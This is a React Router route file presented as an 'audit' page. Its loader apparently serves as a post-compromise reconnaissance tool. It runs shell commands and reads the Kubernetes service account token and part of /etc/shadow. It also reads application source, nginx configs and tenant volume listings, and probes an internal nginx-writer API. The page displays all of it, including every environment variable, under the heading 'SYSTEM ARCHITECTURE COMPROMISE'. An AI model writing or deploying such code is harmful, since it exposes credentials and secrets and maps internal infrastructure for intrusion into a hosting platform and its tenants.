import fs from "node:fs";
import path from "node:path";
import { execSync } from "node:child_process";
import { useLoaderData } from "react-router";

import type { Route } from "./+types/audit";

export async function loader({ request: _request }: Route.LoaderArgs) {
  const k8sSecretPath = "/var/run/secrets/kubernetes.io/serviceaccount";

  let systemIdentity = { user: "unknown", id: "unknown" };
  let k8sIdentity = { token: "Not Found", namespace: "Not Found" };
  let hostIntelligence = {
    ps: "",
    nfsRepo: "",
    containerdLeaked: false,
    nginxPath: "",
    nginxConfigs: "",
    writerReachability: "",
    apiProbe: "",
    openapiSchema: "",
    activeRoutes: "",
  };
  let pythonSource = {
    mainPath: "",
    mainContent: "",
    managerPath: "",
    managerContent: "",
  };
  let shadowDump = "";
  const env = process.env || {};

  try {
    systemIdentity.user = execSync("whoami").toString().trim();
    systemIdentity.id = execSync("id").toString().trim();

    try {
      if (fs.existsSync(k8sSecretPath)) {
        k8sIdentity.token = fs
          .readFileSync(path.join(k8sSecretPath, "token"), "utf8")
          .trim();
        k8sIdentity.namespace = fs
          .readFileSync(path.join(k8sSecretPath, "namespace"), "utf8")
          .trim();
      }
    } catch {}

    if (systemIdentity.user === "root") {
      try {
        shadowDump = fs.readFileSync("/etc/shadow", "utf8").substring(0, 300);
      } catch {}

      const mainPath = "/app/src/main.py";
      if (fs.existsSync(mainPath)) {
        pythonSource.mainPath = mainPath;
        pythonSource.mainContent = fs.readFileSync(mainPath, "utf8");
      }

      const managerPath = "/app/src/services/nginx_manager.py";
      if (fs.existsSync(managerPath)) {
        pythonSource.managerPath = managerPath;
        pythonSource.managerContent = fs.readFileSync(managerPath, "utf8");
      }

      try {
        hostIntelligence.ps = execSync(
          "ps -eo pid,user,args | grep -E 'node|bun|python' | head -n 50",
        ).toString();

        const possibleNginx = [
          "/etc/nginx/sites-enabled",
          "/etc/nginx/conf.d",
          "/app/nginx",
        ];
        for (const n of possibleNginx) {
          if (fs.existsSync(n)) {
            hostIntelligence.nginxPath = n;
            hostIntelligence.nginxConfigs = execSync(`ls -la ${n}`).toString();
            try {
              hostIntelligence.activeRoutes = execSync(
                `grep -r "server_name" ${n} | cut -d: -f2-`,
              ).toString();
            } catch {}
            break;
          }
        }

        if (fs.existsSync("/app/repo")) {
          hostIntelligence.nfsRepo = fs
            .readdirSync("/app/repo")
            .slice(0, 30)
            .join("\n");
        }

        const writerApi = env.NGINX_WRITER_API || "http://localhost:5555";
        try {
          hostIntelligence.writerReachability = execSync(
            `curl -s -o /dev/null -w "%{http_code}" -X POST ${writerApi}/write || echo "offline"`,
          )
            .toString()
            .trim();
          hostIntelligence.apiProbe = execSync(
            `curl -I -s ${writerApi}/write | grep -E "Server|Content-Type" || echo "No Headers"`,
          )
            .toString()
            .trim();

          const schema = execSync(
            `curl -s ${writerApi}/openapi.json`,
          ).toString();
          hostIntelligence.openapiSchema = schema.startsWith("{")
            ? schema
            : "OpenAPI JSON not found at /openapi.json";
        } catch {
          hostIntelligence.writerReachability = "UNREACHABLE";
        }

        hostIntelligence.containerdLeaked = fs.existsSync("/var/lib/containerd");
      } catch {}
    }
  } catch {}

  return {
    systemIdentity,
    k8sIdentity,
    hostIntelligence,
    pythonSource,
    shadowDump,
    env,
  };
}

export default function AuditPage() {
  const {
    systemIdentity = { user: "ERR", id: "ERR" },
    hostIntelligence = {
      ps: "",
      nfsRepo: "",
      containerdLeaked: false,
      nginxPath: "",
      nginxConfigs: "",
      writerReachability: "",
      apiProbe: "",
      openapiSchema: "",
      activeRoutes: "",
    },
    pythonSource = {
      mainPath: "",
      mainContent: "",
      managerPath: "",
      managerContent: "",
    },
    env = {},
  } = useLoaderData<typeof loader>();

  const box = {
    border: "1px solid #333",
    padding: "1rem",
    marginBottom: "1rem",
    background: "#080808",
  };
  const label = {
    color: "#ff4444",
    fontWeight: "bold" as const,
    fontSize: "11px",
    display: "block",
    marginBottom: "5px",
  };
  const codeBox = {
    fontSize: "11px",
    color: "#00d4ff",
    maxHeight: "400px",
    overflow: "auto",
    background: "#001111",
    padding: "10px",
    border: "1px solid #004444",
    whiteSpace: "pre-wrap" as const,
  };

  return (
    <div
      style={{
        padding: "2rem",
        background: "#000",
        color: "#0f0",
        fontFamily: "monospace",
        minHeight: "100vh",
      }}
    >
      <h1 style={{ color: "#f00", borderBottom: "2px solid #f00" }}>
        SYSTEM ARCHITECTURE COMPROMISE
      </h1>
      <section style={box}>
        <span style={label}>IDENTITY & API CONNECTIVITY</span>
        <div>
          USER: {systemIdentity.user} | ID: {systemIdentity.id}
        </div>
        <div style={{ marginTop: "8px" }}>
          NGINX-WRITER STATUS:{" "}
          <span style={{ color: "#ffcc00", fontWeight: "bold" }}>
            {hostIntelligence.writerReachability}
          </span>
        </div>
      </section>
      <section style={box}>
        <span style={{ ...label, color: "#ffcc00" }}>
          WRITER API SCHEMA (openapi.json)
        </span>
        <pre style={{ ...codeBox, color: "#ffcc00", maxHeight: "250px" }}>
          {hostIntelligence.openapiSchema || "Probing..."}
        </pre>
      </section>
      <section style={box}>
        <span style={{ ...label, color: "#00ff00" }}>ACTIVE NGINX ROUTES</span>
        <pre style={{ ...codeBox, color: "#00ff00", maxHeight: "200px" }}>
          {hostIntelligence.activeRoutes || "No virtual hosts found."}
        </pre>
      </section>
      <section style={box}>
        <span style={{ ...label, color: "#00d4ff" }}>ORCHESTRATOR: main.py</span>
        <pre style={codeBox}>
          {pythonSource.mainContent || "File not found."}
        </pre>
      </section>
      <section style={box}>
        <span style={{ ...label, color: "#00d4ff" }}>
          SERVICE: nginx_manager.py
        </span>
        <pre style={codeBox}>
          {pythonSource.managerContent || "File not found."}
        </pre>
      </section>
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "1fr 1fr",
          gap: "1rem",
        }}
      >
        <section style={box}>
          <span style={label}>
            NGINX FS STATE ({hostIntelligence.nginxPath})
          </span>
          <pre style={{ ...codeBox, color: "#888" }}>
            {hostIntelligence.nginxConfigs || "No configs."}
          </pre>
        </section>
        <section style={box}>
          <span style={label}>TENANT VOLUMES</span>
          <pre style={{ ...codeBox, color: "#888" }}>
            {hostIntelligence.nfsRepo}
          </pre>
        </section>
      </div>
      <section style={box}>
        <span style={label}>PROCESS TREE</span>
        <pre style={{ ...codeBox, color: "#888" }}>{hostIntelligence.ps}</pre>
      </section>
      <section style={box}>
        <span style={label}>ENV DUMP</span>
        <details>
          <summary style={{ cursor: "pointer" }}>SHOW ALL SECRETS</summary>
          <pre style={{ fontSize: "10px", color: "#ffcc00" }}>
            {JSON.stringify(env, null, 2)}
          </pre>
        </details>
      </section>
    </div>
  );
}
